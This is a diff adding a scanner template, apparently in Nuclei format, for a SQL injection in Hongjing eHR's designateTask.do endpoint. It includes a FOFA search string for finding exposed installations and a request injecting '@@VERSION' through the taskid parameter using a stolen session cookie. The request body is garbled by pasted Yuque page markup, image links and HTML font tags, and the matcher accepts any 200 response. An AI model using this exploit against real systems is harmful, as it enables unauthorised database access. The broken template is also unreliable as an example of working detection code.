@@ -1,0 +1,53 @@
+id: poc-tid7y5tage5n0tgd
+info:
+  name: 宏景eHR designateTask.do 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tid7y5tage5n0tgd'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tid7y5tage5n0tgd
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Priority: u=0, i
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758455505924-23037d0e-83ab-4104-a6fc-69ac8140d151.png)携带cookie进行注入
+
+
+    **<font style="color:rgb(213, 97, 97);">GET</font>**<font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">/performance/objectiveManage/designateTask.do?</font>**<font style="color:rgb(210, 105, 0);">b_save</font>**<font style="color:rgb(90, 93, 100);">=</font><font style="color:rgb(53, 54, 57);">&</font>**<font style="color:rgb(210, 105, 0);">taskid</font>**<font style="color:rgb(90, 93, 100);">=</font>**<font style="color:rgb(168, 61, 170);">@@VERSION</font>**<font style="color:rgb(53, 54, 57);"> </font>**<font style="color:rgb(55, 153, 105);">HTTP/1.1</font>**
+
+    **<font style="color:rgb(41, 107, 197);">Host</font>**<font style="color:rgb(53, 54, 57);">: </font>
+
+    <font style="color:rgb(41, 107, 197);">Priority</font><font style="color:rgb(53, 54, 57);">: </font><font style="color:rgb(90, 93, 100);">u=0,</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">i</font>
+
+    **<font style="color:rgb(41, 107, 197);">User-Agent</font>**<font style="color:rgb(53, 54, 57);">: </font><font style="color:rgb(90, 93, 100);">Mozilla/5.0</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">(Windows</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">NT</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">10.0;</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">Win64;</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">x64;</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">rv:142.0)</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">Gecko/20100101</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">Firefox/142.0</font>
+
+    <font style="color:rgb(41, 107, 197);">Accept-Language</font><font style="color:rgb(53, 54, 57);">: </font><font style="color:rgb(90, 93, 100);">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</font>
+
+    <font style="color:rgb(41, 107, 197);">Accept</font><font style="color:rgb(53, 54, 57);">: </font><font style="color:rgb(90, 93, 100);">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</font>
+
+    <font style="color:rgb(41, 107, 197);">Accept-Encoding</font><font style="color:rgb(53, 54, 57);">: </font><font style="color:rgb(90, 93, 100);">gzip,</font><font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">deflate</font>
+
+    **<font style="color:rgb(41, 107, 197);">Cookie</font>**<font style="color:rgb(53, 54, 57);">: 获取的cookie</font>
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758455506190-0738ffa4-3960-46cf-9b64-17f85368a417.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
